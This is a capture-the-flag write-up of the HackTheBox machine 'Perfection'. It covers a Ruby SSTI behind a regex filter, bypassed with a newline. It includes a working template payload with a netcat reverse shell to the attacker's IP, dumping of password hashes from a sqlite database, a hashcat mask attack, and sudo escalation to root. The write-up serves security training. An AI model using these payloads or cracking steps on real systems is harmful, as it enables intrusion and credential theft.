---
render_with_liquid: false
title: HackTheBox Writeup  Perfection
date: 2024-03-03 16:19:28 +1400
tags: [hackthebox, nmap, linux, feroxbuster, ffuf, ruby, ssti, regex-bypass, discover-notes, discover-backup, sqlite, name-the-hash, hashcat, hashcat-mask, sudo, misconfiguration]
---



Perfection is an easy Linux machine that features a web application with functionality to calculate student scores. This application is vulnerable to Server-Side Template Injection (SSTI) via regex filter bypass. A foothold can be gained by exploiting the SSTI vulnerability. Enumerating the user reveals they are part of the `sudo` group. Further enumeration uncovers a database with password hashes, and the user's mail reveals a possible password format. Using a mask attack on the hash, the user&amp;amp;#039;s password is obtained, which is leveraged to gain `root` access.


# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Perfection]
└─$ pt init '10.129.122.132 Perfection'
+------------+--------+----------------+------------+
|  PROFILE   | STATUS |       IP       |   DOMAIN   |
+------------+--------+----------------+------------+
| perfection | on     | 10.129.122.132 | Perfection |
+------------+--------+----------------+------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sun Mar  3 16:19:28 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, Perfection
Nmap scan report for Perfection (10.129.122.132)
Host is up, received user-set (0.21s latency).
Scanned at 2024-03-03 16:19:28 CST for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz41H9QQUPCXN7lJsU+fbjZ/vR4Ho/eacq8LnS89xLx4vsJvjUJCcZgMYAmhHLXIGKnVv16ipqPaDom5cK9tig=
|   256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqNwnyqGqYHNSIjQnv7hRU0UC9Q4oB4g9Pfzuj2qcG4
80/tcp open  http    syn-ack ttl 63 nginx
|_http-title: Weighted Grade Calculator
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Mar  3 16:19:42 2024 -- 1 IP address (1 host up) scanned in 13.98 seconds
```

## 80 - HTTP : Weighted Grade Calculator


### Info

```ruby
http://Perfection [200] [Weighted Grade Calculator] [nginx WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)] [Nginx,Ruby:3.0.2] [d723230361b7956cf3a0f26af94d849b2681c022]
```

![](/assets/obsidian/f602efb47caa7f6f37f3f33662e3f461.png)

### Directory

```bash
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -k -t 100 -u "http://$(pt get rhost)" -o ferox_80_big.txt
```

```bash
200      GET        6l       12w      142c http://perfection/css/lato.css
200      GET       11l       52w     3860c http://perfection/images/lightning.png
200      GET       32l      220w    13738c http://perfection/images/checklist.jpg
200      GET      103l      387w     3827c http://perfection/about
200      GET        6l       12w      173c http://perfection/css/montserrat.css
200      GET      142l      444w     5191c http://perfection/weighted-grade
200      GET        4l       66w    31000c http://perfection/css/font-awesome.min.css
200      GET      235l      442w    23427c http://perfection/css/w3.css
200      GET      101l      390w     3842c http://perfection/
400      GET       13l       24w      274c http://perfection/[
400      GET       13l       24w      274c http://perfection/]
200      GET       51l      214w    14842c http://perfection/images/susan.jpg
200      GET      176l     1024w    79295c http://perfection/images/tina.jpg
400      GET       13l       24w      279c http://perfection/plain]
400      GET       13l       24w      279c http://perfection/quote]
[####################] - 2m     40978/40978   0s      found:15      errors:4
```

# User Flag
---

## Shell as susan

### Enumeration

The only dynamic function on port 80 website was http://perfection/weighted-grade

It can calculate weighted grade for 5 rows

![](/assets/obsidian/d8fbff43a8c882081d3151927fdd26f5.png)

After submission, we'll see the result reflected at the bottom

![](/assets/obsidian/fb1c80daeb9ac58e76ae234464697651.png)

If I submit a single quote for `category1` , it will result `Malicious input blocked`

![](/assets/obsidian/a98e508c765bc42ef2326d549c85bf1b.png)

Fuzz special chars to see which special characters were banned

```bash
ffuf -c -w /usr/share/seclists/Fuzzing/special-chars.txt -request-proto http -request calc.req -fs 5221
```

Only slashes and plus sign were allowed

![](/assets/obsidian/3424d0a997dd2b64964fac67aef7aa3b.png)

### SSTI - Ruby

> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby

To bypass the filter, try to append a `Line Feed` ( `\n`) after a whitelisted value, and our SSTI payload after it. This can bypass regex filters that doesn't match multiline

```ruby
x
<%= 7 * 7 %>
```

It worked

![](/assets/obsidian/722af29ec2fc695f4002de32370e132a.png)

Get a shell

```ruby
x
<%= system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.83 1111 >/tmp/f') %>
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Perfection]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.83] from (UNKNOWN) [10.129.122.132] 43964
/bin/sh: 0: can't access tty; job control turned off
$ /usr/bin/script -qc /bin/bash /dev/null
susan@perfection:~/ruby_app$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Perfection]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
susan@perfection:~/ruby_app$ stty rows 50 columns 209
susan@perfection:~/ruby_app$ id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
susan@perfection:~$ cat user.txt
8737adf4f4c6909f882cc4b0ca955370
```

# Root Flag
---

## From susan to root


### Discover password pattern from mail

Susan have `sudo` group, which is very interesting, but I don't have `Susan`'s password

Find group owns

```bash
susan@perfection:~$ find / -type f -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -not -path "/var/lib/*" -group susan -ls 2>/dev/null
    39937      4 -rw-r-----   1 root     susan         625 May 14  2023 /var/mail/susan
     1020      4 -rw-r--r--   1 susan    susan          39 Oct 17 12:26 /home/susan/.vimrc
     1031      4 -rw-r--r--   1 susan    susan         220 Feb 27  2023 /home/susan/.bash_logout
     1065      4 -rw-r-----   1 root     susan          33 Mar  3 08:03 /home/susan/user.txt
     3879      4 -rw-------   1 susan    susan          20 Mar  3 09:31 /home/susan/.lesshst
[...]
     1391      4 -rw-r--r--   1 root     susan        2165 Apr  3  2023 /home/susan/ruby_app/public/images/lightning.png
     1388     12 -rw-r--r--   1 root     susan        8257 Apr  3  2023 /home/susan/ruby_app/public/images/checklist.jpg
     1227     12 -rw-r--r--   1 root     susan        8597 Apr  3  2023 /home/susan/ruby_app/public/images/susan.jpg
     1147      0 -rw-r--r--   1 susan    susan           0 Feb 28  2023 /home/susan/.cache/motd.legal-displayed
```

There's a mail from a student `Tina` implies that `susan`'s password might meet below conditions:

- `{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}`
- All letters of `firstname` is in lowercase

```bash
susan@perfection:~$ cat /var/mail/susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```


### Get password hashes from sqlite DB

Although we know the pattern of password, but we still need to get something to crack

```bash
susan@perfection:~$ ls -latr
total 52
-rw-r--r-- 1 susan susan  807 Feb 27  2023 .profile
-rw-r--r-- 1 susan susan 3771 Feb 27  2023 .bashrc
-rw-r--r-- 1 susan susan  220 Feb 27  2023 .bash_logout
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .bash_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .python_history -> /dev/null
lrwxrwxrwx 1 root  root     9 May 14  2023 .sqlite_history -> /dev/null
-rw-r--r-- 1 susan susan   39 Oct 17 12:26 .vimrc
-rw-r--r-- 1 susan susan    0 Oct 27 06:41 .sudo_as_admin_successful
drwxr-xr-x 3 root  root  4096 Oct 27 10:36 ..
drwxrwxr-x 3 susan susan 4096 Oct 27 10:36 .local
drwx------ 2 susan susan 4096 Oct 27 10:36 .cache
drwxr-xr-x 2 root  root  4096 Oct 27 10:36 Migration
drwx------ 3 susan susan 4096 Oct 27 10:36 .gnupg
drwxr-xr-x 4 root  susan 4096 Oct 27 10:36 ruby_app
-rw-r----- 1 root  susan   33 Mar  3 08:03 user.txt
-rw------- 1 susan susan   20 Mar  3 09:31 .lesshst
drwxr-x--- 7 susan susan 4096 Mar  3 09:31 .
susan@perfection:~$ cd Migration
susan@perfection:~/Migration$ ls -latr
total 16
-rw-r--r-- 1 root  root  8192 May 14  2023 pupilpath_credentials.db
drwxr-xr-x 2 root  root  4096 Oct 27 10:36 .
drwxr-x--- 7 susan susan 4096 Mar  3 09:31 ..
```

The `sqlite` database from `migration` folder contains password hashes for `susan` and her students

```bash
susan@perfection:~/Migration$ sqlite3 ./pupilpath_credentials.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .headers on
sqlite> .mode columns
sqlite> .tables
users
sqlite> select * from users;
id  name            password
--  --------------  ----------------------------------------------------------------
1   Susan Miller    abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2   Tina Smith      dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3   Harry Tyler     d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4   David Lawrence  ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5   Stephen Locke   154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

### Crack susan's password hash

The hash format is `sha-256`

```bash
nth --no-banner -f loot/susan.hash
```

![](/assets/obsidian/1291f22822cac47963fc47e081e0e26a.png)

The password pattern for `Susan` will be `susan_nasus_{randomly generated integer between 1 and 1,000,000,000}`

Use **hashcat** with mask to brute force it

> `pass.hcmask`

```
susan_nasus_?d?d?d?d?d?d?d?d?d
susan_nasus_?d?d?d?d?d?d?d?d
susan_nasus_?d?d?d?d?d?d?d
susan_nasus_?d?d?d?d?d?d
susan_nasus_?d?d?d?d?d
susan_nasus_?d?d?d?d
susan_nasus_?d?d?d
susan_nasus_?d?d
susan_nasus_?d
```

```bash
.\hashcat.exe H:\VM-Share\Kali\susan.hash -a 3 H:\VM-Share\Kali\pass.hcmask -m 1400 -w 3 -S -O
```

![](/assets/obsidian/621749f409fc8cc8823764d87245e3a2.png)

### SUDO - User in sudo group

```bash
susan@perfection:~$ sudo -l
[sudo] password for susan:
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
susan@perfection:~$ sudo su
root@perfection:/home/susan# id
uid=0(root) gid=0(root) groups=0(root)
root@perfection:/home/susan# cat /root/root.txt
50e3d3d1503e878662b4010fc9253990
```

# Additional
---
